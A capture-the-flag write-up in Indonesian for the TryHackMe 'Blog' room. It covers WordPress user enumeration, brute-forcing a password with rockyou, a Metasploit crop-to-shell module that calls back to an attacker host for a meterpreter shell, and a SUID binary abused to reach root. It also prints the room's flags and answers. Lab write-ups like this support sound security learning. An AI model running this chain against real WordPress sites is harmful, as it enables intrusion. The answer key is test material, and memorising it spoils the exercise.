***Blog***

Billy Joel made a Wordpress blog! https://tryhackme.com/room/blog

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/298908f4-dee9-4d00-b22d-a7e5ba69a2c9" />

Writeup TryHackMe: Blog 🚩
Dokumentasi proses Penetration Testing untuk mesin Blog di platform TryHackMe. Fokus utama adalah eksploitasi kerentanan pada CMS WordPress versi lama dan Privilege Escalation melalui binary SUID.
1. Enumerasi (Reconnaissance)
Langkah pertama adalah melakukan pemindaian terhadap target IP untuk mengetahui layanan yang berjalan.
Nmap Scan

```bash

nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

Gunakan kode dengan hati-hati.
Hasil: Ditemukan port 80 (HTTP) menjalankan Apache dan WordPress.
WordPress Enumeration (WPScan)
Melakukan enumerasi user untuk menemukan username yang valid:

```bash

wpscan --url http://blog.thm --enumerate u
```

Gunakan kode dengan hati-hati.
User yang ditemukan: bjoel, kwheel.

2. Exploitation (Gaining Access)
   
Brute Force Password
Menggunakan rockyou.txt untuk mendapatkan password user kwheel:

```bash

wpscan --url http://blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt
```

Gunakan kode dengan hati-hati.
Kredensial ditemukan: kwheel : cutiepie1
Remote Code Execution (RCE)
WordPress versi 5.0 rentan terhadap CVE-2019-8942 (Crop-to-Shell). Menggunakan Metasploit untuk mendapatkan shell:

    ```
    use exploit/multi/http/wp_crop_rce
    set RHOSTS <TARGET_IP>
    set USERNAME kwheel
    set PASSWORD cutiepie1
    set LHOST <IP_VPN_TUN0>
    exploit
    ```

Hasil: Mendapatkan meterpreter session sebagai user www-data.
3. Privilege Escalation (PrivEsc)
Setelah mendapatkan shell, kita perlu naik ke hak akses root.
Mencari Flag User
File user.txt tidak berada di tempat standar, melainkan di media eksternal:
bash

ls -l /media/usb/user.txt

Gunakan kode dengan hati-hati.
(Catatan: Anda butuh akses lebih tinggi untuk membacanya).
Eksploitasi SUID Binary
Mencari binary dengan bit SUID set:

```bash

find / -perm -u=s -type f 2>/dev/null
```

Gunakan kode dengan hati-hati.
Ditemukan binary kustom: /usr/sbin/checker.
Trigger Root Shell
Binary tersebut mengecek variabel environment admin. Dengan memanipulasinya, kita bisa memicu shell root:

```bash

export admin=1
/usr/sbin/checker
```

Gunakan kode dengan hati-hati.
Hasil: Prompt berubah menjadi # (Root).
4. Final Flags 🏁
Setelah menjadi root, kita dapat mengambil kedua flag:

    User Flag: cat /media/usb/user.txt
    
```c8421899aae571f7af486492b71a8ab7```

<img width="449" height="181" alt="image" src="https://github.com/user-attachments/assets/4f209f7c-684b-4595-943f-cacfdc08ccda" />

    Root Flag: cat /root/root.txt
    
```9a0b2b618bef9bfa7ac28c1353d9f318```
    
<img width="976" height="53" alt="image" src="https://github.com/user-attachments/assets/042177b6-6cfd-4e1e-9cf3-7730e107eedb" />

Where was user.txt found? ```/media/usb```

<img width="1270" height="102" alt="image" src="https://github.com/user-attachments/assets/c91f85fb-2b3b-4397-82f7-849e7b4fbf67" />

What CMS was Billy using? ```wordpress```

<img width="1249" height="90" alt="image" src="https://github.com/user-attachments/assets/033a7b47-9e08-4305-ac57-dd2a6f693bd5" />

What version of the above CMS was being used? ```5.0```

<img width="924" height="97" alt="image" src="https://github.com/user-attachments/assets/1c44d562-dbbd-47cc-b6d2-e98c791eada9" />

<img width="1248" height="47" alt="image" src="https://github.com/user-attachments/assets/c7428f8b-a144-47be-9030-2afd4553a1d1" />


Disclaimer: Dokumentasi ini dibuat hanya untuk tujuan edukasi keamanan siber.
